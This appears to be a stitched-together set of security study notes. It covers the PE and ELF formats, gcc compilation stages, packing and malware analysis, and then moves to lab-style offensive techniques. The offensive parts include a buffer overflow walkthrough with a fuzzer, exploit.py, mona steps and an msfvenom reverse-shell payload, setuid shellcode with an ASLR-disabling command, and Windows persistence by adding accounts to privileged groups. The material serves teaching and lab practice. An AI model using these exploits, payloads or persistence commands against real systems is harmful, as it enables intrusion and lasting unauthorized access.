    "c": "Portable Executable (PE) format  PE is a modified version of the Common Object File Format (COFF), which was also used on Unix-based systems before being replaced by ELF. ???the 64-bit version of PE is called PE32+??? The data structures shown in the figure are defined in WinNT.h , which is included in the Microsoft Windows Software Developer Kit. MS-DOS header  One of the main differences with ELF is the presence of an MS-DOS header, for backward compatibility. The main function of the MS-DOS header is to describe how to load and execute an MS-DOS stub, which comes right after the MS-DOS header. This stub is usually just a small MS-DOS program, which is run instead of the main program when the user executes a PE binary in MS-DOS. The MS-DOS header starts with a magic value, which consists of the ASCII characters “MZ”. An important field in the MS-DOS header is the last field, called e_lfanew , containing the file offset at which the real PE binary begins. Thus, when a PE-aware program loader opens the binary, it can read the MS-DOS header and then skip past it and the MS-DOS stub to go right to the start of the PE headers. PE Signature, File Header, and Optional Header  The PE headers is more or less analogous to ELF’s executable header, except that it is split into three parts: a 32- bit signature, a PE file header, and a PE optional header: typedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; nina@tardis:~/Development/pe$ objdump -x hello.exe hello.exe: file format pei-x86-64 hello.exe architecture: i386:x86-64, flags 0x0000012f: HAS_RELOC, EXEC_P, HAS_LINENO, HAS_DEBUG, HAS_LOCALS, D_PAGED start address 0x0000000140001324 Characteristics 0x22 executable large address aware Time/Date Thu Mar 30 14:27:09 2017 Magic 020b (PE32+) MajorLinkerVersion 14 MinorLinkerVersion 10 SizeOfCode 0000000000000e00 SizeOfInitializedData 0000000000001c00 SizeOfUninitializedData 0000000000000000 AddressOfEntryPoint 0000000000001324 BaseOfCode 0000000000001000 ImageBase 0000000140000000 SectionAlignment 00001000 FileAlignment 00000200 MajorOSystemVersion 6 MinorOSystemVersion 0 MajorImageVersion 0 MinorImageVersion 0 MajorSubsystemVersion 6 MinorSubsystemVersion 0 Win32Version 00000000 SizeOfImage 00007000 SizeOfHeaders 00000400 CheckSum 00000000 Subsystem 00000003 (Windows CUI) DllCharacteristics 00008160 HIGH_ENTROPY_VA DYNAMIC_BASE NX_COMPAT TERMINAL_SERVICE_AWARE SizeOfStackReserve 0000000000100000 SizeOfStackCommit 0000000000001000 SizeOfHeapReserve 0000000000100000 SizeOfHeapCommit 0000000000001000 LoaderFlags 00000000 NumberOfRvaAndSizes 00000010 The Data Directory Entry 0 0000000000000000 00000000 Export Directory [.edata (or where ever we found it)] Entry 1 0000000000002724 000000a0 Import Directory [parts of .idata] Entry 2 0000000000005000 000001e0 Resource Directory [.rsrc] Entry 3 0000000000004000 00000168 Exception Directory [.pdata] Entry 4 0000000000000000 00000000 Security Directory Entry 5 0000000000006000 0000001c Base Relocation Directory [.reloc] Entry 6 0000000000002220 00000070 Debug Directory Entry 7 0000000000000000 00000000 Description Directory Entry 8 0000000000000000 00000000 Special Directory Entry 9 0000000000000000 00000000 Thread Storage Directory [.tls] Entry a 0000000000002290 000000a0 Load Configuration Directory Entry b 0000000000000000 00000000 Bound Import Directory Entry c 0000000000002000 00000188 Import Address Table Directory Entry d 0000000000000000 00000000 Delay Import Directory Entry e 0000000000000000 00000000 CLR Runtime Header Entry f 0000000000000000 00000000 Reserved ... PE Signature  The PE signature is a string containing the ASCII characters “PE”, followed by two NULL characters. It is analogous to the magic bytes in the e_ident field in ELF’s executable header. PE File Header  The Machine field describes the architecture of the machine for which the PE file is intended. The NumberOfSections field is the number of entries in the section header table, and SizeOfOptionalHeader is the size in bytes of the optional header that follows the file header. The Characteristics field contains flags describing things such as the endianness of the binary, whether it is a DLL, and whether it has been stripped. PE Optional Header  The PE optional header is not optional for executables (but it may be missing in object files). It contains lots of fields: a 16-bit magic value, which is set to 0x020b for 64-bit PE files, several fields describing the major and minor version numbers of the linker that was used to create the binary, and the minimal operating system version needed to run the binary, to begin with. The ImageBase field describes the address at which to load the binary (PE binaries are designed to be loaded at a specific virtual address). Other pointer fields contain relative virtual addresses (RVAs), which are intended to be added to the base address to derive a virtual address. Section Header table  The PE section header table is an array of IMAGE_SECTION_HEADER structures, each of which describes a single section. Instead of referring to a string table as the ELF section headers do, PE section headers specify the section name using a simple character array field. Because the array is only 8 bytes long, PE section names are limited to 8 characters. // // Section header format. // #define IMAGE_SIZEOF_SHORT_NAME 8 typedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; The PE format does not explicitly distinguish between sections and segments. The closest thing PE files have to ELF’s execution view is the DataDirectory , which provides the loader with a shortcut to certain portions of the binary needed for setting up the execution. But there is no separate program header table; the section header table is used for both linking and loading Sections  Many of the sections in PE files are directly comparable to ELF sections, often even having (almost) the same name. nina@tardis:~/Development/pe$ objdump -x hello.exe ...

The export directory and import directory entries in the DataDirectory array refer to these sections. The .idata section specifies which symbols (functions and data) the binary imports from shared libraries (DLLs in Windows terminology). The .edata section lists the symbols and their addresses that the binary exports. To resolve references to external symbols, the loader needs to match up the required imports with the export table of the DLL that provides the required symbols. When these sections are not present (often the case), they are usually merged into .rdata , but their contents and workings remain the same. When the loader resolves dependencies, it writes the resolved addresses into the Import Address Table (IAT). Similar to the Global Offset Table...",

To explicitly tell gcc to stop after preprocessing and show the intermediate output: nina@tardis:~/Development/anatomy$ gcc -E -P hello.c typedef long unsigned int size_t; typedef __builtin_va_list __gnuc_va_list; typedef unsigned char __u_char; typedef unsigned short int __u_short; typedef unsigned int __u_int; typedef unsigned long int __u_long; typedef signed char __int8_t; ... extern int pclose (FILE *__stream); extern FILE *popen (const char *__command, const char *__modes) __attribute__ ((__malloc__)) __attribute__ ((__malloc__ (pclose, 1))) ; extern char *ctermid (char *__s) __attribute__ ((__nothrow__ , __leaf__)) __attribute__ ((__access__ (__write_only__, 1))); extern void flockfile (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)); extern int ftrylockfile (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)) ; extern void funlockfile (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)); extern int __uflow (FILE *); extern int __overflow (FILE *, int); int main(int argc, char *argv[]) { printf(\"%s\", \"Hello, world!\\n\"); return 0; } The compilation phase takes the preprocessed code and translates it into assembly language, , in reasonably human-readable form, with symbolic information intact. Most compilers also perform heavy optimisation in his phase (configurable with switches such as options -O0 through -O3 in gcc . To tell gcc to stop after this stage and store the assembly files to disk, use the -S flag. Pass the option -masm=intel to gcc to have it produce assembly in Intel syntax instead of the default AT&T syntax: nina@tardis:~/Development/anatomy$ gcc -S -masm=intel hello.c nina@tardis:~/Development/anatomy$ ls hello.c hello.s nina@tardis:~/Development/anatomy$ cat hello.s .file \"hello.c\" .intel_syntax noprefix .text .section .rodata .LC0: .string \"Hello, world!\" .text .globl main .type main, @function main: .LFB0: .cfi_startproc endbr64 push rbp .cfi_def_cfa_offset 16 .cfi_offset 6, -16 mov rbp, rsp .cfi_def_cfa_register 6 sub rsp, 16 mov DWORD PTR -4[rbp], edi mov QWORD PTR -16[rbp], rsi lea rax, .LC0[rip] mov rdi, rax call puts@PLT mov eax, 0 leave .cfi_def_cfa 7, 8 ret .cfi_endproc .LFE0: .size main, .-main .ident \"GCC: (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0\" .section .note.GNU-stack,\"\",@progbits .section .note.gnu.property,\"a\" .align 8 .long 1f - 0f .long 4f - 1f .long 5 0: .string \"GNU\" 1: .align 8 .long 0xc0000002 .long 3f - 2f 2: .long 0x3 3: .align 8 4: nina@tardis:~/Development/anatomy$ The input of the assembly phase is the set of assembly language files generated in the compilation phase, and the output is a set of object files (modules). Object files contain machine instructions executable by the processor. Typically, each source file corresponds to one assembly file, and each assembly file corresponds to one object file. To generate an object file, pass the -c flag to gcc : nina@tardis:~/Development/anatomy$ gcc -c hello.c nina@tardis:~/Development/anatomy$ ls hello.c hello.o hello.s nina@tardis:~/Development/anatomy$ file hello.o hello.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped The term relocatable in the file output indicates it is an object file and not an executable. The linking phase links together all the object files into a single binary executable. The linking phase usually includes an additional optimisation pass, called link-time optimisation (LTO). Static libraries (extension .a on Linux), are merged into the binary executable, allowing any references to them to be resolved entirely. Dynamic libraries, shared in memory among all programs that run on a system are loaded into memory only once, and any binary that wants to use the library needs to use the shared copy. to produce a complete binary executable, use gcc without switches: nina@tardis:~/Development/anatomy$ gcc hello.c nina@tardis:~/Development/anatomy$ ls a.out hello.c hello.o hello.s nina@tardis:~/Development/anatomy$ file a.out a.out: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c8215b952047b1c7a485d388b97c85936de85da4, for GNU/Linux 3.2.0, not stripped To override the default naming, pass the -o switch, followed by a name for the output file. Symbols and stripping  When compiling a program, compilers create and use symbols, which keep track of high-level functions and variables and record which binary code and data correspond to each symbol.

The official list of inside the browser use cases mentions video editing, 3D games, virtual and augmented reality, p2p services, and scientific simulations. Besides making browsers much more powerful than JavaScript could, this standard may even extend the lifespan of websites. WebAssembly is currently being used in mobile and edge based environments with such products as Cloudflare Workers. Files in .wasm format contain low level binary instructions (bytecode), executable at near CPU-native speed by a virtual machine that uses a common stack. The code is packaged in modules, objects that are directly executable by a browser, and each module can be instantiated multiple times. The functions defined inside modules are listed in one dedicated array, or Table, and the corresponding data are contained in another structure, called arraybuffer.

Windows malware typically uses registry keys to establish persistence, a technique used by adversaries to discreetly maintain long-term access to a system despite disruptions. A good example is Registry Run Keys, which allows binaries to be automatically executed when a user logs in or the machine boots up.

At it’s very simplest, file entropy is a rating that scores how random the data within a PE file is. With a scale of 0 to 8. 0 meaning the less “randomness” of the data in the file, where a scoring towards 8 indicates this data is more “random”. For example, files that are encrypted will have a very high entropy score. Where files that have large chunks of the same data such as 1 s will have a low entropy score. Malware authors use techniques such as encryption or packing to obfuscate their code and to attempt to bypass antivirus. Because of this, these files will have high entropy. If an analyst had 1,000 files, they could rank the files by their entropy scoring, and the files with the higher entropy should be analysed first. Packing/unpacking  The unpacking stub unpacks the original executable into memory, resolves imports, and transfers execution to the OEP Executables have what’s called an entry point. When launched, this entry point is simply the location of the first pieces of code to be executed within the file. When an executable is packed, it must unpack itself before any code can execute. Because of this, packers change the entry point from the original location to what’s called the “Unpacking Stub”. The “Unpacking Stub” will begin to unpack the executable into its original state. Once the program is fully unpacked, the entry point will now relocate back to its normal place to begin executing code. It is only at this point can an analyst begin to understand what the executable is doing as it is now in its true, original form. Identifying packers  Opening a packed executable with tools like OllyDbg and IDA-Pro will produce a warning that the executable may be packed. Packed programs have very few imports (usually LoadLibrary and GetProcAddress ), or no import at all. Many packers leave text signatures inside the packed binary. In some cases, the file command will be able to identify the packer ( UPX compressed , PECompact2 compressed ) Tools like PEiD ( python version ) and pev detect most common packers, cryptors and compilers for PE files.

    "c": "Assessment and static analysis  Initial assessment serves determining what tools and analysis methods will be required. This process also helps in the creation of a strategy for analysing the file. This requires carrying out a light static analysis. Origins  One of the purposes of reverse engineering is to help network administrators prevent similar malware from infiltrating a network. Knowing where a file came from could be helpful in securing the channel used to transmit it. For example, if the file being analysed was an email attachment, network administrators should secure the email server. Existing information  Searching the internet for already existing information can be very helpful. There might be existing analyses that has been done on the file, and determine what behaviours to expect. Viewing the file and extracting its text strings  Using tools like file to view the file help determine the type of file. Extracting readable text from the file with strings also gives hints of what messages, functions, and modules it will use when opened or executed. File information  The type of file is the most important piece of information that sets off the whole analysis. If the file type is a Windows executable, a preset of PE tools will be prepared. If the file type is a Word document, a sandbox environment will have to be installed with Microsoft Office and analysis tools that can read the OLE file format. If the given target for analysis is a website, preparations are likely to involve browser tools that can read HTML and debug Java scripts or Visual Basic scripts. Static analysis  Static analysis will help us make notes of what we will do during dynamic analysis. With knowledge of the assembly language, a disassembled file and its branches can be understood.

Calculating the cryptographic hash of the binary file and understanding each of its components helps determine its signature .

    "c": "Malware signatures  Depending on its variant, malware is largely obtrusive - in the sense that it leaves quite an extensive papertrail of evidence … The general process of a malware attack can be broken down into a few broad steps, which will generate data: Delivery: his could be of many methods, for example, USB (Stuxnet) or PDF attachments through “Phishing” campaigns. Execution: What does it do? If it encrypts files and leaves a ransom note, it is Ransomware. If it records keystrokes it is a Keylogger. If it collects personal preferences to display adware, it is Spyware. This stage can only be understood through analysing the sample. Maintaining persistence (not always the case!) Propagation (not always!) There are two categories of fingerprints that malware may leave behind on a Host after an attack: Host-Based Signatures are the results of execution and any persistence performed by a Malware. For example, has a file been encrypted? Has any additional software been installed? These are two of many host-based signatures that are useful to know to prevent and check against further infection. Network-Based Signatures are the observations of any networking communication taking place during delivery, execution and propagation. For example, in Ransomware, the Malware contacted which wallet for Bitcoin payments? Or for example, a large amount of “Samba” Protocol communication attempts may be an indication of WannaCry infection because of its use of “Eternalblue”.",

    "t": "Executable and Linkable Format (ELF) ",
    "c": "Executable and Linkable Format (ELF)  Executable and Linkable Format (ELF) is the default binary format on Linux-based systems. It is used for executable files, object files, shared libraries, and core dumps. Executable header  Every ELF file starts with an executable header, which is just a structured series of bytes telling you that it’s an ELF file, what kind of ELF file it is, and where in the file to find all the other contents. The executable header is represented in /usr/include/elf.h as a C struct called Elf64_Ehdr : #define EI_NIDENT (16) typedef struct { unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf32_Half e_type; /* Object file type */ Elf32_Half e_machine; /* Architecture */ Elf32_Word e_version; /* Object file version */ Elf32_Addr e_entry; /* Entry point virtual address */ Elf32_Off e_phoff; /* Program header table file offset */ Elf32_Off e_shoff; /* Section header table file offset */ Elf32_Word e_flags; /* Processor-specific flags */ Elf32_Half e_ehsize; /* ELF header size in bytes */ Elf32_Half e_phentsize; /* Program header table entry size */ Elf32_Half e_phnum; /* Program header table entry count */ Elf32_Half e_shentsize; /* Section header table entry size */ Elf32_Half e_shnum; /* Section header table entry count */ Elf32_Half e_shstrndx; /* Section header string table index */ } Elf32_Ehdr; e_ident  The executable header (and the ELF file) starts with a 16-byte array called e_ident . The e_ident array always starts with a 4-byte “magic value” identifying the file as an ELF binary. The magic value consists of the hexadecimal number 0x7f , followed by the ASCII character codes for the letters E, L, and F. Having these bytes right at the start is convenient because it allows tools such as file, as well as specialized tools such as the binary loader, to quickly discover that they’re dealing with an ELF file. /* Fields in the e_ident array. The EI_* macros are indices into the array. The macros under each EI_* macro are the values the byte may have. */ #define EI_MAG0 0 /* File identification byte 0 index */ #define ELFMAG0 0x7f /* Magic number byte 0 */ #define EI_MAG1 1 /* File identification byte 1 index */ #define ELFMAG1 'E' /* Magic number byte 1 */ #define EI_MAG2 2 /* File identification byte 2 index */ #define ELFMAG2 'L' /* Magic number byte 2 */ #define EI_MAG3 3 /* File identification byte 3 index */ #define ELFMAG3 'F' /* Magic number byte 3 */ /* Conglomeration of the identification bytes, for easy testing as a word. */ #define ELFMAG \"\\177ELF\" #define SELFMAG 4 Following the magic value, there are a number of bytes that give more detailed information about the specifics of the type of ELF file. In elf.h , the indexes for these bytes (indexes 4 through 15 in the e_ident array) are symbolically referred to as EI_CLASS , EI_DATA , EI_VERSION , EI_OSABI , EI_ABIVERSION , and EI_PAD , respectively. #define EI_CLASS 4 /* File class byte index */ #define ELFCLASSNONE 0 /* Invalid class */ #define ELFCLASS32 1 /* 32-bit objects */ #define ELFCLASS64 2 /* 64-bit objects */ #define ELFCLASSNUM 3 The EI_CLASS byte denotes whether the binary is for a 32-bit or 64-bit architecture. In the former case, the EI_CLASS byte is set to the constant ELFCLASS32 (which is equal to 1), while in the latter case, it’s set to ELFCLASS64 (equal to 2). #define EI_DATA 5 /* Data encoding byte index */ #define ELFDATANONE 0 /* Invalid data encoding */ #define ELFDATA2LSB 1 /* 2's complement, little endian */ #define ELFDATA2MSB 2 /* 2's complement, big endian */ #define ELFDATANUM 3 The EI_DATA byte indicates the endianness of the binary. A value of ELFDATA2LSB (equal to 1) indicates little-endian, while ELFDATA2MSB (equal to 2) means big-endian. #define EI_VERSION 6 /* File version byte index */ /* Value must be EV_CURRENT */ The next byte, called EI_VERSION , indicates the version of the ELF specification used when creating the binary. Currently, the only valid value is EV_CURRENT , which is defined to be equal to 1. #define EI_OSABI 7 /* OS ABI identification */ #define ELFOSABI_NONE 0 /* UNIX System V ABI */ #define ELFOSABI_SYSV 0 /* Alias. */ #define ELFOSABI_HPUX 1 /* HP-UX */ #define ELFOSABI_NETBSD 2 /* NetBSD. */ #define ELFOSABI_GNU 3 /* Object uses GNU ELF extensions. */ #define ELFOSABI_LINUX ELFOSABI_GNU /* Compatibility alias. */ #define ELFOSABI_SOLARIS 6 /* Sun Solaris. */ #define ELFOSABI_AIX 7 /* IBM AIX. */ #define ELFOSABI_IRIX 8 /* SGI Irix. */ #define ELFOSABI_FREEBSD 9 /* FreeBSD. */ #define ELFOSABI_TRU64 10 /* Compaq TRU64 UNIX. */ #define ELFOSABI_MODESTO 11 /* Novell Modesto. */ #define ELFOSABI_OPENBSD 12 /* OpenBSD. */ #define ELFOSABI_ARM_AEABI 64 /* ARM EABI */ #define ELFOSABI_ARM 97 /* ARM */ #define ELFOSABI_STANDALONE 255 /* Standalone (embedded) application */ If the EI_OSABI byte is set to nonzero, it means that some ABI- or OS-specific extensions are used in the ELF file; this can change the meaning of some other fields in the binary or can signal the presence of nonstandard sections. The default value of zero indicates that the binary targets the UNIX System V ABI. #define EI_ABIVERSION 8 /* ABI version */ The EI_ABIVERSION byte denotes the specific version of the ABI indicated in the EI_OSABI byte that the binary targets. You’ll usually see this set to zero because it’s not necessary to specify any version information when the default EI_OSABI is used. #define EI_PAD 9 /* Byte index of padding bytes */ The EI_PAD field actually contains multiple bytes, namely, indexes 9 through 15 in e_ident . All of these bytes are currently designated as padding; they are reserved for possible future use but currently set to zero.

    "c": "Using Immunity Debugger  Run Kali VM connected to THM over VPN. Start the Room Machine and note the IP address. Remote desktop from your Kali VM to the IP address of the Machine using Remmina. xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea Start Immunity  Immunity setup In the Machine, right-click the Immunity Debugger icon on the Desktop and choose Run as administrator . When Immunity loads, configure mona (bottom of Immunity): !mona config -set workingfolder c:\\mona\\%p Click the open file icon, or choose File -> Open . Navigate to the vulnerable-apps folder on the admin user’s desktop, and then the oscp folder. Select the oscp.exe binary and open it. The binary will open in a “paused” state, so click the red play icon or choose Debug -> Run . In a terminal window, the oscp.exe binary should be running, and tells us that it is listening on port 1337 . On the Kali box, connect to port 1337 on MACHINE using netcat: nc MACHINE_IP 1337 Type “HELP” and press Enter. Note that there are 10 different OVERFLOW commands numbered 1 - 10. Type “OVERFLOW1 test” and press enter. The response should be “OVERFLOW1 COMPLETE”. Terminate the connection. Fuzzing the program  To fuzz the ospc.exe program to see if it is vulnerable, send it a long string of characters. This long string of characters will eventually exceed the memory buffer causing the buffer overflow. Use the script below and adapt it with the IP address of the host and the overflow to target. #!/usr/bin/env python3 import socket , time , sys ip = \"MACHINE_IP\" port = 1337 timeout = 5 prefix = \"OVERFLOW1 \" string = prefix + \"A\" * 100 while True : try : with socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) as s : s . settimeout ( timeout ) s . connect (( ip , port )) s . recv ( 1024 ) print ( \"Fuzzing with {} bytes\" . format ( len ( string ) - len ( prefix ))) s . send ( bytes ( string , \"latin-1\" )) s . recv ( 1024 ) except : print ( \"Fuzzing crashed at {} bytes\" . format ( len ( string ) - len ( prefix ))) sys . exit ( 0 ) string += 100 * \"A\" time . sleep ( 1 ) Make sure ospc.exe is running in Immunity Debugger, then launch the fuzzing script. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent. Creating a cyclic pattern  Finding the EIP offset requires creating a pattern with the length that was required to crash the program. For example, by using Metasploit and adding 400 bytes to the 2000 that crashed the server: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400 Edit the python payload below and add the cyclic pattern to the payload variable: import socket ip = \"MACHINE_IP\" port = 1337 prefix = \"OVERFLOW1 \" offset = 0 overflow = \"A\" * offset retn = \"\" padding = \"\" payload = \"\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) try : s . connect (( ip , port )) print ( \"Sending evil buffer...\" ) s . send ( bytes ( buffer + \" \\r\\n \" , \"latin-1\" )) print ( \"Done!\" ) except socket . error : print ( \"Could not connect.\" ) Name it exploit.py and launch it. python3 exploit.py After the Python exploit crashed the script, go to the Immunity debugger and run the mona command to find the EIP offset: !mona findmsp -distance 2000 This should open the Log window. If it does not then open it manually and look for the following entry in the output. EIP contains normal pattern : ... (offset 1978) Update the exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to BBBB . Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B’s (e.g. 42424242 ). Finding bad characters  Bad characters are unwanted characters that break the shellcode. For Buffer Overflows to be successful we have to make sure payloads do not contain any bad characters (badchars). Badchars such as null bytes ( \\x00 ) could cause a payload to crash the program rather than executing the code specified. !mona bytearray -b \"\\x00\" To use Mona to create a Byte Array to compare the payload to, create a Byte Array which will exclude all the badchars found, starting with the Null Byte. To create a byte array to use as a payload: for x in range(1, 256): print(\"\\\\x\" + \"{:02x}\".format(x), end='') print() Name it, run it, and paste the results as payload in the exploit.py script. Reopen and run the vulnerable oscp.exe application in Immunity Debugger. Then run the exploit script. When the script has completed, go back to the Immunity Debugger and look for the ESP register in the CPU window. Right-click the ESP register, copy the address to the clipboard, then run the following mona command to compare it to the Byte Array that Mono created earlier: !mona compare -f C:\\mona\\oscp\\bytearray.bin -a 01AFFA30 This produces a window containing all the bad characters that need to eliminated from our script. Note that some of these characters may not be bad characters. For example \\x07 could be bleeding into \\x08 and making it look bad. The process must be repeated for each “bad character”. \\x00  Create byte array !mona bytearray -b \"\\x00\" Remove byte from payload string Run Get ESP address Compare the hex dump with characters sent !mona compare -f C:\\mona\\oscp\\bytearray.bin -a 018BFA30 \\x00\\x07  Create byte array !mona bytearray -b \"\\x00\\x07\" Remove \\x07 byte from payload string Run Get ESP address Compare the hex dump with characters sent !mona compare -f C:\\mona\\oscp\\bytearray.bin -a 019AFA30 \\x00\\x07\\x2e  Create byte array !mona bytearray -b \"\\x00\\x07\\x2e\" Remove \\x2e byte from payload string Run Get ESP address Compare the hex dump with characters sent !mona compare -f C:\\mona\\oscp\\bytearray.bin -a 019AFA30 Keep rinsing until the comparison results status returns Unmodified . This indicates that no more badchars are present. The results window now looks like: No badchars left Finding the jump point  When an access violation occurs, the ESP register points to memory which contains the data which was sent to the application. JMP ESP Instruction is used to redirect the code execution to that location. To find the JMP ESP, use a module of mona with –cpb option and all the bad characters found earlier, to prevent mona returning a memory pointer with badchars. With all badchars identified, to use Mona to find a jump point in the application: !mona jmp -r esp -cpb \"\\x00\\x07\\x2e\\xa0\" Generate payload  Use msfvenom to create the payload: msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 EXITFUNC=thread -b \"\\x00\\x07\\x2e\\xa0\" -f c Endianness  There are two ways by which a computer stores multibyte data types like int and float, these two types are known as Little Endian and Big Endian. x86 is known as Little Endian architecture. In this architecture, the last byte of the binary is stored first. In Big Endian, the exact opposite happens: The first byte of the binary is stored first. When working with x86 architecture the JMP ESP address must be converted into Little Endian format. When adding the return address, reverse the JMP address. NOP-sled  A NOP-sled (No Operation sled) is a sequence of no-operation instructions which is responsible for sliding the CPU’s execution flow to the next memory address. Prepending nops before the shellcode, it does not matter where the buffer is located. When the return pointer hits the NOP-sled then as the name suggests it is going to slide the return address until it reaches the beginning of the shellcode. NOP values are different for different CPUs. To create ssome space in memory for the payload to unpack itself, set the padding variable to a string of 16 or more nops ( \"\\x90\" ) bytes: padding = \"\\x90\" * 16 Exploit  With the correct prefix, offset, return address, padding, and payload set,...",

The EIP can be controlled to execute malicious code at the user level of access. This happens when the vulnerable program is running at the user level of privilege. The EIP can be controlled to execute malicious code at the system or root level. Some Linux functionalities should be protected and reserved for the root user. It is common practice to use Set-user Identification (SUID) and Set-group identification (SGID) to temporarily elevate a process to allow some files to be executed under their owner’s and/or group’s privilege level. But when the SUID/SGID program is vulnerable, a successful exploitation would drop the privileges of the file owner or group (root). Local buffer overflow exploits  #include <stdio.h> #include <sys/mman.h> const char shellcode[] = //setuid(0) & Aleph1's famous shellcode, see ref. \"\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\" //setuid(0) first \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; int main() { //main function //The shellcode is on the .data segment, //we will use mprotect to make the page executable. mprotect( (void *)((int)shellcode & ~4095), 4096, PROT_READ | PROT_WRITE | PROT_EXEC ); //Convert the address of the shellcode variable to a function pointer, //allowing us to call it and execute the code. int (*ret)() = (int(*)())shellcode; return ret(); } ASLR  Address space layout randomization (ASLR) works by randomizing the locations of different sections of the program in memory, including the executable base, stack, heap, and libraries, making it difficult for an attacker to reliably jump to a specific memory address. To disable ASLR : $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space NOP sled  The NOP (no operation) command simply means to do nothing but move to the next command. Hackers have learned to use NOP for padding. When placed at the front of an exploit buffer, this padding is called a NOP sled. If the EIP is pointed to a NOP sled, the processor will ride the sled right into the next component. On x86 systems, the 0x90 opcode is the most commonly used NOP. Any operation sequence that does not interfere with the exploit’s outcome would be considered equivalent to a NOP. Shellcode  Shellcode is a string of binary opcodes for the exploited architecture (Intel x86 32 bit, Intel x86 64 bit, etc), often represented in hexadecimal form. There are tons of shellcode libraries online, for all platforms. Using printf and wc to calculate size of a shellcode: $ printf \"\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\" | wc -c 53 Find address  To find where to point EIP in order to execute the shellcode: $ gdb -q --args ./meet Mr `python -c 'print(\"A\"*412)'` (gdb) run Starting program: /path/to/meet Mr AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ... Program received signal SIGSEGV, Segmentation fault. 0x41414141 in ?? () To look at what is on the stack, use the gdb examine memory command (for example in batches of 32 words (4 bytes) at a time): (gdb) x/32z $esp-200 Pick an address from the middle of the NOP sled to overwrite EIP. Final exploit code: For meet.c , 412 bytes - 53 bytes of shellcode - 4 bytes return address (reversed due to the little-endian style of x86 processors) = 355 bytes $ ./meet Mr `python -c \"print('\\x90'*355 + '\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh' + '\\x24\\xd2\\xff\\xff')\" Exploit development process  In the real world, vulnerabilities are not always as straightforward as the meet.c example. The stack overflow exploit development process generally follows these steps: Control the execution flow (EIP register) by identifying a vulnerability that results in an overflow of a return address. Determine the offset(s) and constrains (bad characters breaking the exploit such as line feeds, carriage returns, and null bytes). Determine the attack vector. Debug and trace the program’s flow during the overflow. Build the exploit. Test the exploit.",

The cost of the countermeasure compared to the impact of the vulnerability being exploited. The possibility that the countermeasure can reveal information to the adversary. Example: We can expect that a SIEM would make it reasonably uncomplicated to detect suspicious activity and connect three events such as scanning with Nmap, sending various phishing emails, and using the Metasploit framework from the same machine.

    "c": "Tampering with unprivileged accounts  Having administrator credentials is the easiest way to achieve persistence. And to make it harder for the blue team to detect us, we can manipulate unprivileged user accounts, which will most likely not be monitored as much as administratoraccounts, and grant those administrative privileges. Assign group memberships  Assume you have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use. The direct way to make an unprivileged user gain administrative privileges is to make it part of the Administrators group: net localgroup administrators <username> /add This will allow username to access the server by using RDP, WinRM or any other remote administration service available. Alternatively, use the Backup Operators group. Users in this group will not have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow for copying the content of the SAM and SYSTEM registry hives, which can be uses to recover password hashes for all the users, enabling escalation to any administrative account. net localgroup \"Backup Operators\" <username> /add Such an account cannot RDP or WinRM back into the machine unless it is added it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups: net localgroup \"Remote Management Users\" <username> /add And, LocalAccountTokenFilterPolicy strips any local account of its administrative privileges when logging in remotely. While being able to elevate privileges through UAC from a graphical user session, when using WinRM, the account is confined to a limited access token with no administrative privileges. To regain administration privileges for the account, disable LocalAccountTokenFilterPolicy by changing this registry key to 